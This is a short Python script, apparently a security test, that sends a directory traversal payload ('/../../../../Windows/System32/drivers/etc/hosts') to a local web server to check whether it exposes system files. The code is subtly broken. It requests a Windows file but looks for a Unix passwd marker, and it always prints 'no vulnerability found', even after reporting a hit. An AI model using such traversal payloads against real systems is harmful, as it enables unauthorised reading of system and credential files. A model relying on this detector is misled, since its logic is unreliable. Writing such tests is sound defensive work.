import requests

def test_directory_traversal(url):
    # Directory Traversal payload
    payload = "/../../../../Windows/System32/drivers/etc/hosts"

    try:
        response = requests.get(url + payload)
        if "root:x:0:0:" in response.text:
            print("Potential Directory Traversal vulnerability detected.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

    print("Test completed, no vulnerability found.")

# Remplacez 'http://yourserver.com' par l'URL de votre serveur
test_directory_traversal('http://127.0.0.1:8080')